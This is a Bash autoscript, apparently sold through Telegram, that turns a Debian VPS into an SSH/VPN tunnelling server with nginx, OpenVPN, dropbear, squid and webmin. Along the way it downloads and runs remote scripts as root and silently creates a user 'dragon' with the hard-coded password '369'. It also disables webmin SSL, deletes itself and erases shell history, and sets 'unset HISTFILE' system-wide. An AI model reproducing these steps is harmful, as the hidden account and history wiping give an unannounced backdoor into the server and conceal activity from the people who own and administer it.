#!/bin/bash

# START SCRIPT (FLuxoScript)
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
if [ $USER != 'root' ]; then
echo "Sorry, for run the script please using root user"
exit 1
fi

if [[ $USER != "root" ]]; then
	echo "Maaf, Anda harus menjalankan ini sebagai root"
	exit
fi

# initialisasi var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
MYIP=$(wget -qO- ipv4.icanhazip.com);
MYIP2="s/xxxxxxxxx/$MYIP/g";
ether=`ifconfig | cut -c 1-8 | sort | uniq -u | grep venet0 | grep -v venet0:`
if [[ $ether = "" ]]; then
        ether=eth0
fi

#vps="zvur";
vps="aneka";

if [[ $vps = "zvur" ]]; then
	source="https://raw.githubusercontent.com/EraHitam/F3Luxo/master"
else
	source="https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For7_only"
fi

clear      
echo ""
echo -e "\e[38;5;226m   AUTOSCRIPT VPS/@orangkuatsabahanterkini 2018       "
echo -e "\e[38;5;6m  ===================================================================="
echo -e "\e[38;5;226m *            TELEGRAM  :  https://t.me/orangkuatsabahanterkini     *"
echo -e "\e[38;5;200m  *               GROUP  :   https://                                *"
echo -e "\e[38;5;226m *             CHANNEL  : @NewPremiumService                        *"
echo -e "\e[38;5;6m  ===================================================================="
echo -e "\e[38;5;226m *                    AUTOSCRIPT VPS 2018                            *"
echo -e "\e[38;5;6m  ===================================================================="
# check registered ip
wget -q -O IP "https://raw.githubusercontent.com/EraHitam/F3Luxo/master/IP.txt"
wget -q -O IP "https://raw.githubusercontent.com/EraHitam/F3Luxo/master/IP.txt"
if ! grep -w -q $MYIP IP; then
	echo "Maaf Bro Hanya IP terdaftar sahaja yang boleh menggunakan Autoscript ini" 
	if [[ $vps = "zvur" ]]; then
		echo "PM Telagram: @orangkuatsabahanterkini untuk dapatkan harga diskaun "
	else
		echo "PM Telegram: @orangkuatsabahanterkini untuk dapatkan harga diskaun " 
	fi
	rm -f /root/IP
	exit
fi
# go to root
cd
 red='\e[1;31m'
               green='\e[0;32m'
               NC='\e[0m'

               echo -e "\e[38;5;82m Connecting to Autoscript OrangKuatsab..."
			   sleep 1

			   echo -e "\e[38;5;11m Connecting to your ip : $myip ...."
               sleep 2
                          echo -e "\e[38;5;13m Proses ini akan mengambil masa 10-15 minit"
		sleep 2.5	  
			   echo -e "\e[38;5;226m IP ANDA Berjaya Di Daftarkan..."
               sleep 1.5
               
			   echo -e "${green}Mula Setup...${NC}"
               sleep 1
	       cd
# go to root
cd

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

# install wget and curl
apt-get update;apt-get -y install wget curl;

# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
service ssh restart

# set repo
wget -O /etc/apt/sources.list $source/sources.list.debian7
wget "http://www.dotdeb.org/dotdeb.gpg"
wget "http://www.webmin.com/jcameron-key.asc"
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg
cat jcameron-key.asc | apt-key add -;rm jcameron-key.asc

# remove unused
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;
#apt-get -y autoremove;

# update
apt-get update;apt-get -y upgrade;

# install webserver
apt-get -y install nginx php5-fpm php5-cli

# install essential package
echo "mrtg mrtg/conf_mods boolean true" | debconf-set-selections
apt-get -y install bmon 
apt-get -y install iftop 
apt-get -y install htop 
apt-get -y install nmap 
apt-get -y install axel 
apt-get -y install nano 
apt-get -y install iptables 
apt-get -y install traceroute 
apt-get -y install sysv-rc-conf 
apt-get -y install dnsutils 
apt-get -y install bc 
apt-get -y install nethogs
apt-get -y install openvpn 
apt-get -y install vnstat 
apt-get -y install less 
apt-get -y install screen 
apt-get -y install psmisc 
apt-get -y install apt-file 
apt-get -y install whois 
apt-get -y install ptunnel 
apt-get -y install ngrep 
apt-get -y install mtr 
apt-get -y install git 
apt-get -y install zsh 
apt-get -y install mrtg 
apt-get -y install snmp 
apt-get -y install snmpd 
apt-get -y install snmp-mibs-downloader 
apt-get -y install unzip 
apt-get -y install unrar 
apt-get -y install rsyslog 
apt-get -y install debsums 
apt-get -y install rkhunter
apt-get -y install build-essential
apt-get -y --force-yes -f install libxml-parser-perl

# disable exim
service exim4 stop
sysv-rc-conf exim4 off

# update apt-file
apt-file update

# setting vnstat
vnstat -u -i $ether
vnstat -i $ether
service vnstat restart

# install neofetch
echo "deb http://dl.bintray.com/dawidd6/neofetch jessie main" | sudo tee -a /etc/apt/sources.list
curl -L "https://bintray.com/user/downloadSubjectPublicKey?username=bintray" -o Release-neofetch.key && sudo apt-key add Release-neofetch.key && rm Release-neofetch.key
apt-get update
apt-get install neofetch

echo "clear" >> .bashrc
echo 'echo -e "WELCOME GRETONGER $HOSTNAME"' >> .bashrc
echo 'echo -e "Script By OrgKuatsabah"' >> .bashrc
echo 'echo -e "Ketik menu untuk menampilkan daftar perintah"' >> .bashrc
echo 'echo -e ""' >> .bashrc

# webmin
apt-get -y install webmin
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf

# install webserver
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For8_9/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>Welcome webserver MBAH SHONDONG Hawok Hawok Jozz</pre>" > /home/vps/public_html/index.html
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For8_9/vps.conf"
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
service php5-fpm restart
service nginx restart

# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For8_9/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For8_9/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules
# etc
wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For8_9/client.ovpn"
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
cd;wget https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For8_9/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash dragon
echo "dragon:369" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
clear

cd
# install badvpn
wget -O /usr/bin/badvpn-udpgw $source/badvpn-udpgw
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw $source/badvpn-udpgw64
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300

# install mrtg
#apt-get update;apt-get -y install snmpd;
wget -O /etc/snmp/snmpd.conf "https://raw.githubusercontent.com/EraHitam/fawDeb/master/null/snmpd.conf"
wget -O /root/mrtg-mem "https://raw.githubusercontent.com/EraHitam/fawDeb/master/null/mrtg-mem.sh"
chmod +x /root/mrtg-mem
cd /etc/snmp/
sed -i 's/TRAPDRUN=no/TRAPDRUN=yes/g' /etc/default/snmpd
service snmpd restart
snmpwalk -v 1 -c public localhost 1.3.6.1.4.1.2021.10.1.3.1
mkdir -p /home/vps/public_html/mrtg
cfgmaker --zero-speed 100000000 --global 'WorkDir: /home/vps/public_html/mrtg' --output /etc/mrtg.cfg public@localhost
curl "https://raw.githubusercontent.com/EraHitam/fawDeb/master/null/mrtg.conf" >> /etc/mrtg.cfg
sed -i 's/WorkDir: \/var\/www\/mrtg/# WorkDir: \/var\/www\/mrtg/g' /etc/mrtg.cfg
sed -i 's/# Options\[_\]: growright, bits/Options\[_\]: growright/g' /etc/mrtg.cfg
indexmaker --output=/home/vps/public_html/mrtg/index.html /etc/mrtg.cfg
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
cd

# setting port ssh
sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
service ssh restart

# install dropbear
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=443/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 443 -p 80 -b /etc/issue.net"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
service ssh restart
service dropbear restart

# install vnstat gui
cd /home/vps/public_html/
wget $source/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
cd vnstat
sed -i "s/eth0/$ether/g" config.php
sed -i "s/\$iface_list = array('venet0', 'sixxs');/\$iface_list = array($ether);/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php
cd

# install fail2ban
apt-get -y install fail2ban;service fail2ban restart;

# install squid3
apt-get -y install squid3
wget -O /etc/squid3/squid.conf $source/squid3.conf
sed -i $MYIP2 /etc/squid3/squid.conf;
service squid3 restart

# install webmin
cd
wget -O webmin-current.deb http://www.webmin.com/download/deb/webmin-current.deb
dpkg -i --force-all webmin-current.deb
apt-get -y -f install;
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
rm -f /root/webmin-current.deb
service webmin restart
service vnstat restart

# install pptp vpn
wget $source/pptp.sh
chmod +x pptp.sh
./pptp.sh


#swap ram
wget https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For8_9/swap-ram.sh
chmod +x swap-ram.sh
./swap-ram.sh

#bonus block torrent
wget https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For8_9/torrent.sh
chmod +x torrent.sh
./torrent.sh

# Install Dos Deflate
apt-get -y install dnsutils dsniff
wget https://raw.githubusercontent.com/EraHitam/F3Luxo/master/For8_9/ddos-deflate-master.zip
unzip master.zip
cd ddos-deflate-master
./install.sh
cd

# Install Menu
cd
wget https://raw.githubusercontent.com/EraHitam/F3Luxo/master/m3nu/menu
mv ./menu /usr/local/bin/menu
chmod +x /usr/local/bin/menu

# finishing
chown -R www-data:www-data /home/vps/public_html
service cron restart
service nginx start
service php5-fpm start
service vnstat restart
service snmpd restart
service ssh restart
service dropbear restart
service fail2ban restart
service squid3 restart
service webmin restart
cd
rm -f /root/.bash_history && history -c
echo "unset HISTFILE" >> /etc/profile
cd
red='\e[1;31m'
               green='\e[0;32m'
               NC='\e[0m'

               echo -e "\e[38;5;82m KAMI TENGAH BUAT KIRAAN VPS ANDA..."
			   sleep 1

			   echo -e "\e[38;5;11m DALAM KIRAAN 3...."
               sleep 2
                          echo -e "\e[38;5;13m DALAM KIRAAN 2"
		sleep 2.5	  
			   echo -e "\e[38;5;226m DALAM KIRAAN 1..."
               sleep 1.5
               
			   echo -e "${green}SUDAH BERJAYA...${NC}"
               sleep 1
cd
## info
echo ""  | tee -a log-install.txt
echo -e "\e[38;5;197m--------------------------- Penjelasan Setup Server ----------------------------\e[0m" 
echo -e "\e[38;5;9m                         Copyright orangkuatsabahanterkini                \e[0m" 
echo -e "\e[38;5;9m                        https://t.me/orangkuatsabahanterkini              \e[0m"  
echo -e "\e[38;5;197m--------------------------------------------------------------------------------\e[0m" 
echo "========================================"  | tee -a log-install.txt
echo "Service Autoscript OrangKuatSabahanTerkini (OrangKuatSabahanTerkini SCRIPT 2017)"  | tee -a log-install.txt
echo "----------------------------------------"  | tee -a log-install.txt 
echo ""  | tee -a log-install.txt
echo -e "\e[38;5;82mnginx : http://$myip:80\e[0m"   | tee -a log-install.txt 
echo -e "\e[38;5;82mWebmin : http://$myip:10000/\e[0m"  | tee -a log-install.txt 
echo -e "\e[38;5;82mSquid3 : 8080\e[0m" | tee -a log-install.txt 
echo -e "\e[38;5;82mOpenSSH : 22\e[0m"  | tee -a log-install.txt
echo -e "\e[38;5;82mDropbear : 109'110'442\e[0m"  | tee -a log-install.txt
echo -e "\e[38;5;82mSSL : 443\e[0m" | tee -a log-install.txt 
echo -e "\e[38;5;82mOpenVPN  : IP/client.ovpn\e[0m"  | tee -a log-install.txt
echo "Fail2Ban : [on]"  | tee -a log-install.txt 
echo "Timezone : Asia/Kuala_Lumpur"  | tee -a log-install.txt 
echo "Menu : type menu to check menu script"  | tee -a log-install.txt 
echo ""  | tee -a log-install.txt | lolcat
echo "----------------------------------------" 
echo "LOG INSTALL  --> /root/log-install.txt" 
echo "----------------------------------------"
echo "========================================"  | tee -a log-install.txt
echo "      PLEASE REBOOT TO TAKE EFFECT !" | lolcat
echo "========================================"  | tee -a log-install.txt
cat /dev/null > ~/.bash_history && history -c
